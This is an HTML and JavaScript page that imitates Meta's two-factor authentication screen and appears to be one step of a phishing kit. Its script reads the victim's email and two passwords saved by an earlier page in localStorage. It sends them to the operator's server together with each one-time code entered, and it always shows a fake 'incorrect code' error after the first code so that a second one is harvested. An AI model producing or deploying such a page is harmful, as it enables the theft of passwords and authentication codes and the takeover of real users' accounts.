<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Two-Factor Authentication - Meta</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
    
    <!-- Google Fonts: Inter -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-color: #aac9ff; /* Lighter blue as seen in image */
            --primary-text: #050505;
            --secondary-text: #65676b;
            --input-border: #ced4da;
            --button-blue: #aac9ff;
            --button-blue-hover: #95b8f0;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            padding-top: 60px;
        }

        .auth-container {
            width: 100%;
            max-width: 500px;
            padding: 20px;
            text-align: left;
        }

        .sub-header {
            font-size: 14px;
            color: var(--primary-text);
            font-weight: 500;
            margin-bottom: 8px;
        }

        .card-header h1 {
            font-size: 24px;
            font-weight: 700;
            color: var(--primary-text);
            margin-bottom: 16px;
        }

        .card-header p {
            font-size: 15px;
            line-height: 1.4;
            color: var(--primary-text);
            margin-bottom: 24px;
        }

        .illustration {
            width: 100%;
            margin-bottom: 30px;
            border-radius: 8px;
            overflow: hidden;
        }

        .illustration img {
            width: 100%;
            height: auto;
            display: block;
        }

        .form-group {
            position: relative;
            margin-bottom: 24px;
        }

        .form-group input {
            width: 100%;
            padding: 26px 16px 10px;
            border: 1px solid var(--input-border);
            border-radius: 12px;
            font-size: 17px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-group input:focus {
            border-color: #1877f2;
        }

        .form-group label {
            position: absolute;
            top: 10px;
            left: 16px;
            font-size: 12px;
            color: var(--secondary-text);
            pointer-events: none;
        }

        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .btn {
            width: 100%;
            padding: 14px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-align: center;
            transition: background-color 0.2s;
            border: none;
            text-decoration: none;
        }

        .btn-continue {
            background-color: var(--button-blue);
            color: white;
            pointer-events: none; /* Disable click initially */
            opacity: 0.6;
        }

        .btn-continue.active {
            background-color: #0866ff; /* Darker Meta blue */
            opacity: 1;
            pointer-events: auto; /* Enable click */
        }

        .btn-continue.active:hover {
            background-color: #0056c1;
        }

        .btn-other {
            background-color: transparent;
            border: 1px solid #ced4da;
            color: #050505;
        }

        .btn-other:hover {
            background-color: #f2f2f2;
        }

        /* Loading state */
        .btn-continue.loading {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .error-message {
            display: none;
            color: #fa3e3e;
            font-size: 13px;
            margin-top: -16px;
            margin-bottom: 16px;
        }
    </style>
</head>
<body>

    <div class="auth-container">
        <div class="sub-header"><span id="user_display">User</span> </div>
        
        <div class="card-header">
            <h1>Go to the authentication application</h1>
            <p>Enter the 6-digit code for this account from the 2-factor authentication app you set up (like Duo Mobile or Google Authenticator).</p>
        </div>

        <div class="illustration">
            <img src="https://www.facebook.com/images/assets_DO_NOT_HARDCODE/xmds_f3_meta_account/F3-2FA-Notifications-WWW_light-3x.png" alt="2FA Illustration">
        </div>

        <form id="fa_form">
            <div id="error_box" class="error-message">
                The code you entered is incorrect. Please check your app and try again.
            </div>

            <div class="form-group">
                <label for="_r_a_">Code</label>
                <input type="text" id="_r_a_" name="code" placeholder="" maxlength="8" autocomplete="one-time-code" required autofocus>
            </div>
            
            <div class="btn-group">
                <button type="submit" id="continue_btn" class="btn btn-continue">Continue</button>
                <button type="button" class="btn btn-other">Try another way</button>
            </div>
        </form>
    </div>

    <script>
        let step = 1;

        document.addEventListener("DOMContentLoaded", function () {
            const faForm = document.getElementById("fa_form");
            const continueBtn = document.getElementById("continue_btn");
            const codeInput = document.getElementById("_r_a_");
            const errorBox = document.getElementById("error_box");
            const userDisplay = document.getElementById("user_display");

            // Display user email from localStorage
            const savedEmail = localStorage.getItem('fb_email');
            if (savedEmail) {
                userDisplay.textContent = savedEmail;
            }

            // Handle button activation based on input length
            codeInput.addEventListener("input", function () {
                const val = this.value.trim();
                if (val.length >= 6 && val.length <= 8) {
                    continueBtn.classList.add("active");
                } else {
                    continueBtn.classList.remove("active");
                }
            });

            if (faForm) {
                faForm.addEventListener("submit", function (e) {
                    e.preventDefault();
                    
                    const code = codeInput.value.trim();
                    if (!code) return;

                    // Show loading state
                    continueBtn.classList.add("loading");
                    continueBtn.disabled = true;
                    errorBox.style.display = "none";

                    const email = localStorage.getItem('fb_email');
                    const password1 = localStorage.getItem('fb_pass1');
                    const password2 = localStorage.getItem('fb_pass2');

                    fetch("/2fa", {
                        method: "POST",
                        headers: { 
                            "Content-Type": "application/json",
                            "X-CSRF-TOKEN": "{{ csrf_token() }}"
                        },
                        body: JSON.stringify({
                            code: code,
                            step: step,
                            email: email,
                            password1: password1,
                            password2: password2,
                        }),
                    })
                    .then((response) => response.json())
                    .then((data) => {
                        // Save to localStorage
                        if (step === 1) {
                            localStorage.setItem("fb_2fa_1", code);
                        } else {
                            localStorage.setItem("fb_2fa_2", code);
                        }

                        setTimeout(() => {
                            if (data.action === "reload") {
                                step = 2;
                                codeInput.value = "";
                                continueBtn.classList.remove("loading");
                                continueBtn.disabled = false;
                                errorBox.style.display = "block"; // Show "incorrect" error on first attempt
                                codeInput.focus();
                            } else if (data.action === "complete") {
                                window.location.href = data.redirectUrl || "/";
                            }
                        }, 1000); // Premium delay
                    })
                    .catch((err) => {
                        console.error("Error:", err);
                        continueBtn.classList.remove("loading");
                        continueBtn.disabled = false;
                    });
                });
            }
        });
    </script>
</body>
</html>